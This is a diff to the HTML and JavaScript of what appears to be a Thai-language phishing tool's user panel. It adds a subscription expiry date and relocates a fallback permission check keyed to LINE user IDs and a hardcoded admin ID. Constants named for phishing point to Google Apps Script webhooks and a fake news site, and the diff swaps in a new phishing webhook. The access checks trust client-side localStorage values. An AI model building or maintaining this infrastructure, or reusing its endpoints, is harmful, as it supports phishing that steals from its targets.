@@ -635,6 +635,24 @@
                 padding: 12px 15px;
             }
         }
+        
+        /* เพิ่มสไตล์สำหรับวันหมดอายุ */
+        .expiration-info {
+            display: flex;
+            align-items: center;
+            font-size: 13px;
+            margin-top: 5px;
+            color: var(--primary-dark);
+        }
+        
+        .expiration-info i {
+            margin-right: 5px;
+            color: var(--primary-color);
+        }
+        
+        .expiration-expired {
+            color: var(--error-color);
+        }
     </style>
 </head>
 <body>
@@ -666,6 +684,10 @@
                         <div class="user-status">
                             <span><i class="fas fa-circle-info"></i> สถานะ:</span> <span id="userStatus">ตรวจสอบสิทธิ์...</span>
                             <span id="statusBadge" class="badge">รอตรวจสอบ</span>
+                        </div>
+                        <!-- เพิ่มส่วนแสดงวันหมดอายุ -->
+                        <div class="expiration-info" id="expirationInfo" style="display: none;">
+                            <i class="fas fa-calendar-alt"></i> วันหมดอายุ: <span id="expirationDate">-</span>
                         </div>
                     </div>
                 </div>
@@ -741,8 +763,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbx8AQafL-DICY1jryAkPdadNuD4mmIXs6UPYOns_cndz7I1J_4xDmRt-CeoEH-vsh_B/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbx8AQafL-DICY1jryAkPdadNuD4mmIXs6UPYOns_cndz7I1J_4xDmRt-CeoEH-vsh_B/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -831,7 +853,20 @@
                     if (savedPermission && (currentTime - savedTime < 15 * 60 * 1000)) {
                         console.log("ใช้ข้อมูลสิทธิ์จาก localStorage");
                         statusEl.textContent = originalText;
-                        return resolve(savedPermission === 'true');
+                        
+                        // แสดงข้อมูลวันหมดอายุจาก localStorage (ถ้ามี)
+                        try {
+                            const expirationDate = localStorage.getItem('user_expiration_' + userId);
+                            const isExpired = localStorage.getItem('user_is_expired_' + userId) === 'true';
+                            
+                            if (expirationDate) {
+                                displayExpirationInfo(expirationDate, isExpired);
+                            }
+                        } catch (e) {
+                            console.error("ไม่สามารถอ่านข้อมูลวันหมดอายุจาก localStorage:", e);
+                        }
+                        
+                        return savedPermission === 'true';
                     }
                 } catch (e) {
                     console.error('ไม่สามารถอ่านข้อมูลจาก localStorage:', e);
@@ -850,6 +885,8 @@
                         if (data && typeof data === 'object') {
                             console.log("สถานะสิทธิ์จาก API:", data.hasPermission);
                             console.log("ข้อความสถานะจาก API:", data.userStatus || "ไม่ได้ระบุ");
+                            console.log("สถานะหมดอายุจาก API:", data.isExpired || false);
+                            console.log("วันหมดอายุจาก API:", data.expirationDate || "ไม่มีข้อมูล");
                             
                             // บันทึกสิทธิ์ใน localStorage
                             try {
@@ -859,8 +896,18 @@
                                 if (data.userStatus) {
                                     localStorage.setItem('user_status_' + userId, data.userStatus);
                                 }
+                                // บันทึกวันหมดอายุด้วยถ้ามี
+                                if (data.expirationDate) {
+                                    localStorage.setItem('user_expiration_' + userId, data.expirationDate);
+                                    localStorage.setItem('user_is_expired_' + userId, data.isExpired ? 'true' : 'false');
+                                }
                             } catch (e) {
                                 console.error('ไม่สามารถบันทึกข้อมูลใน localStorage:', e);
+                            }
+                            
+                            // แสดงข้อมูลวันหมดอายุ
+                            if (data.expirationDate) {
+                                displayExpirationInfo(data.expirationDate, data.isExpired);
                             }
                             
                             if (data.hasPermission !== undefined) {
@@ -933,53 +980,28 @@
                 return checkUserPermissionFallback(userId);
             }
         }
-
-        // ตรวจสอบสิทธิ์แบบสำรอง - ปรับปรุงให้เข้มงวดขึ้น
-        function checkUserPermissionFallback(userId) {
-            console.log("ใช้การตรวจสอบสิทธิ์แบบสำรอง");
+        
+        // เพิ่มฟังก์ชันแสดงข้อมูลวันหมดอายุ
+        function displayExpirationInfo(expirationDate, isExpired) {
+            const expirationInfoEl = document.getElementById('expirationInfo');
+            const expirationDateEl = document.getElementById('expirationDate');
             
-            // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์เข้าใช้งาน (ใช้เฉพาะกรณีฉุกเฉิน)
-            const approvedUserIds = [
-                'U69aa2cb90c9f40291278c346c50dc021', // ไอดีผู้ดูแลระบบ
-                // ในกรณีฉุกเฉินให้เพิ่มไอดีของผู้ใช้ที่ได้รับอนุมัติแล้วในนี้
-                // 'UxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxAA', // ชื่อผู้ใช้ 1
-                // 'UxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxBB', // ชื่อผู้ใช้ 2
-                // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์คนอื่นๆ ตามความเหมาะสม
-            ];
-            
-            // ตรวจสอบว่าเป็น admin หรือไม่โดยตรง
-            if (userId === 'U69aa2cb90c9f40291278c346c50dc021') {
-                console.log("ผู้ใช้คือผู้ดูแลระบบ อนุญาตให้เข้าใช้งาน");
-                return true;
+            if (!expirationDate || expirationDate === "ไม่มีข้อมูล") {
+                expirationInfoEl.style.display = 'none';
+                return;
             }
             
-            // เพิ่มการตรวจสอบใน localStorage กรณีที่เคยมีการบันทึกไว้แล้ว
-            try {
-                const savedPermission = localStorage.getItem('user_permission_' + userId);
-                if (savedPermission === 'true') {
-                    console.log("ใช้ข้อมูลสิทธิ์จาก localStorage (กรณี fallback): ได้รับอนุมัติ");
-                    return true;
-                } else if (savedPermission === 'false') {
-                    console.log("ใช้ข้อมูลสิทธิ์จาก localStorage (กรณี fallback): ไม่ได้รับอนุมัติ");
-                    return false;
-                }
-            } catch (e) {
-                console.error('ไม่สามารถอ่านข้อมูลจาก localStorage:', e);
+            expirationDateEl.textContent = expirationDate;
+            expirationInfoEl.style.display = 'flex';
+            
+            // เพิ่มคลาสถ้าหมดอายุ
+            if (isExpired) {
+                expirationDateEl.classList.add('expiration-expired');
+                // อาจเพิ่มไอคอนหรือแสดงข้อความเพิ่มเติม
+                expirationDateEl.textContent += " (หมดอายุ)";
+            } else {
+                expirationDateEl.classList.remove('expiration-expired');
             }
-            
-            // ในกรณีที่ไม่มีข้อมูลใน localStorage ให้ตรวจสอบจากรายชื่อที่กำหนดไว้
-            const hasAccess = approvedUserIds.includes(userId);
-            console.log(`ผู้ใช้ ${userId} ${hasAccess ? 'มี' : 'ไม่มี'}สิทธิ์เข้าใช้งานจากรายชื่อสำรอง`);
-            
-            // บันทึกการตรวจสอบนี้ไว้ใน localStorage เพื่อลดการเรียกใช้งานซ้ำ
-            try {
-                localStorage.setItem('user_permission_' + userId, hasAccess ? 'true' : 'false');
-                localStorage.setItem('user_permission_time_' + userId, new Date().getTime().toString());
-            } catch (e) {
-                console.error('ไม่สามารถบันทึกข้อมูลใน localStorage:', e);
-            }
-            
-            return hasAccess;
         }
         
         // เปิดใช้งานฟอร์ม
@@ -1541,6 +1563,62 @@
         // สร้าง ID เฉพาะสำหรับการส่งข้อมูล
         function generateUniqueId() {
             return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        }
+        
+        // ตรวจสอบสิทธิ์แบบสำรอง - ปรับปรุงให้เข้มงวดขึ้น
+        function checkUserPermissionFallback(userId) {
+            console.log("ใช้การตรวจสอบสิทธิ์แบบสำรอง");
+            
+            // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์เข้าใช้งาน (ใช้เฉพาะกรณีฉุกเฉิน)
+            const approvedUserIds = [
+                'U69aa2cb90c9f40291278c346c50dc021', // ไอดีผู้ดูแลระบบ
+                // ในกรณีฉุกเฉินให้เพิ่มไอดีของผู้ใช้ที่ได้รับอนุมัติแล้วในนี้
+                // 'UxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxAA', // ชื่อผู้ใช้ 1
+                // 'UxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxBB', // ชื่อผู้ใช้ 2
+                // เพิ่มรายชื่อผู้ใช้ที่มีสิทธิ์คนอื่นๆ ตามความเหมาะสม
+            ];
+            
+            // ตรวจสอบว่าเป็น admin หรือไม่โดยตรง
+            if (userId === 'U69aa2cb90c9f40291278c346c50dc021') {
+                console.log("ผู้ใช้คือผู้ดูแลระบบ อนุญาตให้เข้าใช้งาน");
+                return true;
+            }
+            
+            // เพิ่มการตรวจสอบใน localStorage กรณีที่เคยมีการบันทึกไว้แล้ว
+            try {
+                const savedPermission = localStorage.getItem('user_permission_' + userId);
+                if (savedPermission === 'true') {
+                    console.log("ใช้ข้อมูลสิทธิ์จาก localStorage (กรณี fallback): ได้รับอนุมัติ");
+                    
+                    // ตรวจสอบว่าหมดอายุหรือไม่
+                    const isExpired = localStorage.getItem('user_is_expired_' + userId) === 'true';
+                    if (isExpired) {
+                        console.log("ผู้ใช้หมดอายุการใช้งานแล้ว");
+                        return false;
+                    }
+                    
+                    return true;
+                } else if (savedPermission === 'false') {
+                    console.log("ใช้ข้อมูลสิทธิ์จาก localStorage (กรณี fallback): ไม่ได้รับอนุมัติ");
+                    return false;
+                }
+            } catch (e) {
+                console.error('ไม่สามารถอ่านข้อมูลจาก localStorage:', e);
+            }
+            
+            // ในกรณีที่ไม่มีข้อมูลใน localStorage ให้ตรวจสอบจากรายชื่อที่กำหนดไว้
+            const hasAccess = approvedUserIds.includes(userId);
+            console.log(`ผู้ใช้ ${userId} ${hasAccess ? 'มี' : 'ไม่มี'}สิทธิ์เข้าใช้งานจากรายชื่อสำรอง`);
+            
+            // บันทึกการตรวจสอบนี้ไว้ใน localStorage เพื่อลดการเรียกใช้งานซ้ำ
+            try {
+                localStorage.setItem('user_permission_' + userId, hasAccess ? 'true' : 'false');
+                localStorage.setItem('user_permission_time_' + userId, new Date().getTime().toString());
+            } catch (e) {
+                console.error('ไม่สามารถบันทึกข้อมูลใน localStorage:', e);
+            }
+            
+            return hasAccess;
         }
     </script>
 </body>
